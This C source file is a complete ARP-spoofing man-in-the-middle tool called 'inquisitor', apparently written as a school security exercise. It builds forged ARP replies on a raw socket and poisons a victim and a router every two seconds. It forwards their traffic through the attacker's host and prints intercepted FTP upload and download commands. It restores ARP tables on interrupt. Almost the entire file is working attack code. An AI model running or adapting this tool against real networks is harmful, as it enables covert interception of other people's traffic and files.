#include "inquisitor.h"
//eliminar luego
#include "include/inquisitor.h"

#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <netinet/tcp.h>
#include <net/if.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <signal.h>
#include <netinet/ip.h>
#include <ifaddrs.h>

volatile int loop = 42;

static void usage(void)
{
	printf("./inquisitor [IP-src] [MAC-src] [IP-target] [MAC-target]\n");
	exit(1);
}

static void cleaning(int socket, struct ifaddrs *ifaddr)
{
	if (socket > 0)
		close(socket);
	if (ifaddr)
		freeifaddrs(ifaddr);
}

void error(const char *message)
{
	printf("[INQUISITOR] error: %s\n", message);
	exit(1);
}

//nic = network interface card
static char *get_nic(struct ifaddrs *ifaddr)
{
	char *nic;
	int family, flag;
	
	nic = NULL;
	for (struct ifaddrs *ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) 
	{
		if (ifa->ifa_addr == NULL)
			continue;
		if (ifa->ifa_flags & IFF_LOOPBACK)
			continue;
		flag = 0;
		family = ifa->ifa_addr->sa_family;
		if (family == AF_PACKET) 
		{
			if (ifa->ifa_flags & IFF_UP)
				flag++;
			if (ifa->ifa_flags & IFF_RUNNING)
				flag++;
		}
		if (flag == 2)
		{
			nic = ifa->ifa_name;
			break ;
		}
	}
	return (nic);
}

static int raw_socket()
{
	struct timeval tv_out;
	int sock_fd;
	tv_out.tv_sec = 2;
    tv_out.tv_usec = 0;

	sock_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (sock_fd < 0)
		return (0);
	if (setsockopt(sock_fd, SOL_SOCKET, SO_RCVTIMEO, &tv_out, sizeof(tv_out)) < 0)
		return (sock_fd);
	return (sock_fd);
}

static int send_data(int sock, int index, void *data, size_t len, unsigned char *dest_mac) 
{
	struct sockaddr_ll sll;

	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;      
	sll.sll_ifindex = index;     
	sll.sll_halen = ETH_ALEN; 

	memcpy(sll.sll_addr, dest_mac, ETH_ALEN);

	if (sendto(sock, data, len, 0, (struct sockaddr *)&sll, sizeof(sll)) < 0) 
		return (0);
	return (1);
}

static void fill_arp_request(t_session session, struct arp_packet *pkt, int protocol)
{
	//Ethernet header	
	memset(pkt->eth.h_dest, 0xff, 6);          		// Destino: Broadcast (ff:ff:ff:ff:ff:ff)
	memcpy(pkt->eth.h_source, session.src.mac, 6);   // Origen: MAC
	pkt->eth.h_proto = htons(ETH_P_ARP);			// Tipo: ARP (0x0806)

	//Body ARP
	pkt->arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER); // Hardware: Ethernet (1)
	pkt->arp.ea_hdr.ar_pro = htons(ETH_P_IP);    // Protocolo: IPv4 (0x0800)
	pkt->arp.ea_hdr.ar_hln = 6;                  // Tamaño MAC: 6
	pkt->arp.ea_hdr.ar_pln = 4;                  // Tamaño IP: 4
	pkt->arp.ea_hdr.ar_op = htons(protocol); // Operación: REQUEST | REPLY

	//Directions inside body ARP
	memcpy(pkt->arp.arp_sha, session.src.mac, 6);           // Sender MAC
	memcpy(pkt->arp.arp_spa, &session.src.ip.s_addr, 4);    // Sender IP
	memcpy(pkt->arp.arp_tha, session.dst.mac, 6);  	       // Target MAC 
	memcpy(pkt->arp.arp_tpa, &session.dst.ip.s_addr, 4);    // Target IP 
}

static unsigned char *receive_arp_response(int socket)
{
	struct arp_packet resp;
	struct sockaddr_ll from;
	socklen_t from_len = sizeof(from);

	ssize_t res = recvfrom(socket, &resp, sizeof(resp), 0, (struct sockaddr*)&from, &from_len);

	if (res > 0) 
	{
		if (ntohs(resp.eth.h_proto) == ETH_P_ARP && ntohs(resp.arp.ea_hdr.ar_op) == ARPOP_REPLY) 
		{
			unsigned char *mac = resp.arp.arp_sha;
			return (mac);
		}
	}
	return (0);
}

static void get_access_point_mac(int socket, unsigned int *index, t_session session, t_pair *access_point, struct ifaddrs *ifaddr)
{
	unsigned char *temp_mac;
	struct arp_packet pkt;
	t_session first;

	char *name = get_nic(ifaddr);
	*index = if_nametoindex(name);           
	first.src.ip = session.dst.ip;
	memcpy(first.src.mac, session.dst.mac, 6);
	first.dst.ip = session.src.ip;
	memset(first.dst.mac, 0, 6);
			//session -> src -> ip victim  
			//session -> src -> mac attacker 
			//session -> dst -> ip router  
			//session -> dst -> mac router 
	fill_arp_request(first, &pkt, ARPOP_REQUEST);
	if (send_data(socket, *index, &pkt, sizeof(struct arp_packet), pkt.eth.h_dest) == 0)
	{
		cleaning(socket, ifaddr);
		error("Failed to send");
	}
	temp_mac = receive_arp_response(socket);
	if (temp_mac)
    	memcpy(access_point->mac, temp_mac, 6);
	else 
	{
		cleaning(socket, ifaddr);
		error("Cannot get access point MAC");
	}
}

static void arp_restore(int sock, int index, t_session session, t_pair access_point)
{
	t_session router_session;
	struct arp_packet router_packet;
	struct arp_packet victim_packet;
	
	memcpy(session.src.mac, access_point.mac, 6);
	//RESTORE ROUTER 
	//session -> src -> ip victim  
	//session -> src -> mac victim 
	//session -> dst -> ip router  
	//session -> dst -> mac router 
	fill_arp_request(session, &victim_packet, ARPOP_REPLY);
	send_data(sock, index, &victim_packet, sizeof(struct arp_packet), session.dst.mac);

	router_session.src.ip = session.dst.ip;
	memcpy(router_session.src.mac, session.dst.mac, 6);
	router_session.dst.ip = session.src.ip;
	memcpy(router_session.dst.mac, session.src.mac, 6);
	//RESTORE VICTIM 
	//router_session -> src -> ip router  
	//router_session -> src -> mac router 
	//router_session -> dst -> ip victim  
	//router_session -> dst -> mac victim 
	fill_arp_request(router_session, &router_packet, ARPOP_REPLY);
	send_data(sock, index, &router_packet, sizeof(struct arp_packet) ,router_session.dst.mac);
}

static void forwarding(int sock, int index, unsigned char *buffer, ssize_t bytes, t_session session, t_pair victim)
{
	struct ethhdr *eth = (struct ethhdr *)buffer;
	struct sockaddr_ll socket_address;

	if (memcmp(eth->h_dest, session.src.mac, 6) == 0) 
		{
			//SERVER->VICTIM
			if (memcmp(eth->h_source, session.dst.mac, 6) == 0) {
				memcpy(eth->h_source, session.src.mac, 6); // MAC attacker
				memcpy(eth->h_dest, victim.mac, 6);      // MAC victim 
			}
			//VICTIM->SERVER
			else if (memcmp(eth->h_source, victim.mac, 6) == 0) {
				memcpy(eth->h_source, session.src.mac, 6); //MAC attacker 
				memcpy(eth->h_dest, session.dst.mac, 6);   //MAC router 
			}
			memcpy(socket_address.sll_addr, eth->h_dest, 6);
			send_data(sock, index, buffer, bytes, eth->h_dest);
		}
}

static void snoop_payload(unsigned char *buffer, struct iphdr *ip, ssize_t bytes)
{
	struct tcphdr *tcp = (struct tcphdr *)(buffer + sizeof(struct ethhdr) + (ip->ihl * 4));

			//calculo dónde empiezan los datos del FTP
			unsigned char *payload = (unsigned char *)tcp + (tcp->th_off * 4);
			int payload_size = bytes - (sizeof(struct ethhdr) + (ip->ihl * 4) + (tcp->th_off * 4));

			if (payload_size > 0)
			{
				if (memmem(payload, payload_size, "STOR ", 5))
					printf("\033[1;31m[INQUISITOR] DETECTADO 'PUT': %.*s\033[0m", payload_size, payload);
				else if (memmem(payload, payload_size, "RETR ", 5))
					printf("\033[1;34m[INQUISITOR] DETECTADO 'GET': %.*s\033[0m", payload_size, payload);
			}
}

static void poisoning(int sock, int index, t_session session, t_pair access_point)
{
	struct arp_packet router_packet;
	struct arp_packet victim_packet;
	t_session router_session;
	time_t last_poison = 0;
	unsigned char buffer[2048];

	//t_session router_session;
	router_session = session;
	router_session.src.ip = session.dst.ip;
	router_session.dst.ip = session.src.ip;

	memcpy(router_session.dst.mac, access_point.mac, 6);

	while(loop)
	{
		time_t now = time(NULL);
		if (now - last_poison >= 2)
		{
			//POISON VICTIM 
			//session -> src -> ip victim  
			//session -> src -> mac attacker 
			//session -> dst -> ip router  
			//session -> dst -> mac router 
			//access_point -> mac victim
			fill_arp_request(session, &victim_packet, ARPOP_REPLY);
			send_data(sock, index, &victim_packet, sizeof(struct arp_packet), access_point.mac);
			//POISON ROUTER 
			//router_session -> src -> ip router  
			//router_session -> src -> mac attacker 
			//router_session -> dst -> ip victim  
			//router_session -> dst -> mac victim 
			fill_arp_request(router_session, &router_packet, ARPOP_REPLY);
			send_data(sock, index, &router_packet, sizeof(struct arp_packet), session.dst.mac);
			last_poison = now;
		}

		ssize_t bytes = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
		struct iphdr *ip = (struct iphdr *)(buffer + sizeof(struct ethhdr));

		if (ip->protocol == IPPROTO_TCP) 
			snoop_payload(buffer, ip, bytes);
		forwarding(sock, index, buffer, bytes, session, access_point);
	}
	arp_restore(sock, index, session, access_point);
	//CHECK ARP RESTORE
	// loop = 42;
	// while (loop)
	// {
	// 	sleep(2);
	// 	printf("check if is clean :D! ip neigh show\n");
	// }
}

//signal handler
static void loop_handler(int sig)
{
	loop = 0;
	(void)sig;
	printf("\n");
}

int main (int ac, char *av[])
{
	int socket = 0;
	unsigned int index;
	t_session session;
	t_pair access_point;
	struct ifaddrs *ifaddr;

	if (ac != 5)	
		usage();
	parse_input(av, &session);
	if (getifaddrs(&ifaddr) == -1)\
		error("cannot access mac address of the system");
	socket = raw_socket();
	if (socket <= 0)
	{
		cleaning(socket, ifaddr);
		error("socket failed");
	}
	get_access_point_mac(socket, &index, session, &access_point, ifaddr);
	signal(SIGINT, loop_handler);
	poisoning(socket, index, session, access_point);
	cleaning(socket, ifaddr);
	return (0);
}
